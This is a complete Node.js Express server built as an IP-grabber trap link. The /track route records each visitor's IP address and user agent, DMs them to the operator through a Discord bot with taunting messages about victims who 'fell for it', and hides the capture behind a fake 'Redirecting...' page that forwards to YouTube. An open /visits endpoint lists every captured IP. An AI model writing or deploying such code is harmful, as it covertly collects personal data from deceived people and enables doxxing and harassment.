const express = require("express");
const fs = require("fs");
const app = express();
const PORT = process.env.PORT || 3000;
const LOG_FILE = "visits.json";

// ============================================================
const BOT_TOKEN = process.env.TOKEN;
const YOUR_DISCORD_USER_ID = "1473465013946552362";
// ============================================================

if (!fs.existsSync(LOG_FILE)) {
  fs.writeFileSync(LOG_FILE, JSON.stringify([]));
}

const dmMessages = [
  `bro someone actually clicked it 💀 they cooked`,
  `LMAOO another one fell for it 🔥`,
  `bro really said lemme click this link 💀💀`,
  `caught in 4k no cap 😭🔥`,
  `they really said bet and clicked it 💀`,
  `anotha one 🎉 they had no idea lmaooo`,
  `bro walking into the trap rn 😭😭`,
  `nah they really clicked it on god 💀🔥`,
];

async function sendDM(ip, userAgent, totalHits, time) {
  try {
    const { default: fetch } = await import("node-fetch");

    const randomMsg = dmMessages[Math.floor(Math.random() * dmMessages.length)];

    const message =
      `${randomMsg}\n\n` +
      `**ip:** \`${ip}\`\n` +
      `**when:** ${time}\n` +
      `**device:** ${userAgent.split(" ").slice(0, 5).join(" ")}\n` +
      `**total hits so far:** ${totalHits} 🍳`;

    const dmRes = await fetch("https://discord.com/api/v10/users/@me/channels", {
      method: "POST",
      headers: {
        Authorization: `Bot ${BOT_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ recipient_id: YOUR_DISCORD_USER_ID }),
    });
    const dm = await dmRes.json();

    await fetch(`https://discord.com/api/v10/channels/${dm.id}/messages`, {
      method: "POST",
      headers: {
        Authorization: `Bot ${BOT_TOKEN}`,
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ content: message }),
    });

    console.log("[DM] notification sent no cap");
  } catch (err) {
    console.error("[DM] failed to send dm rip:", err);
  }
}

app.get("/track", (req, res) => {
  const ip = req.headers["x-forwarded-for"] || req.socket.remoteAddress;
  const userAgent = req.headers["user-agent"] || "Unknown";
  const timestamp = new Date().toISOString();
  const time = new Date().toLocaleString("en-US", {
    timeZone: "America/Chicago",
    dateStyle: "short",
    timeStyle: "short",
  });

  const visit = { ip, userAgent, timestamp };

  const visits = JSON.parse(fs.readFileSync(LOG_FILE));
  visits.push(visit);
  fs.writeFileSync(LOG_FILE, JSON.stringify(visits, null, 2));

  console.log(`[VISIT] bro really clicked it 💀 — ip: ${ip} — ${timestamp}`);

  sendDM(ip, userAgent, visits.length, time);

  res.send(`
    <!DOCTYPE html>
    <html>
    <head>
      <meta charset="UTF-8" />
      <title>Loading...</title>
      <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
          background: #0f0f0f;
          color: white;
          font-family: sans-serif;
          display: flex;
          flex-direction: column;
          align-items: center;
          justify-content: center;
          height: 100vh;
          gap: 20px;
        }
        .spinner {
          width: 48px;
          height: 48px;
          border: 5px solid #333;
          border-top-color: #fff;
          border-radius: 50%;
          animation: spin 0.8s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
        p { font-size: 16px; color: #aaa; }
        #countdown { color: white; font-weight: bold; }
      </style>
    </head>
    <body>
      <div class="spinner"></div>
      <p>Redirecting in <span id="countdown">3</span> seconds...</p>
      <script>
        let t = 3;
        const el = document.getElementById("countdown");
        const iv = setInterval(() => {
          t--;
          el.textContent = t;
          if (t <= 0) {
            clearInterval(iv);
            window.location.href = "https://www.youtube.com";
          }
        }, 1000);
      </script>
    </body>
    </html>
  `);
});

app.get("/visits", (req, res) => {
  const visits = JSON.parse(fs.readFileSync(LOG_FILE));
  res.json(visits);
});

app.get("/", (req, res) => res.send("servers up no cap ✅"));

app.listen(PORT, () => {
  console.log(`server running on port ${PORT} lets goooo 🔥`);
});
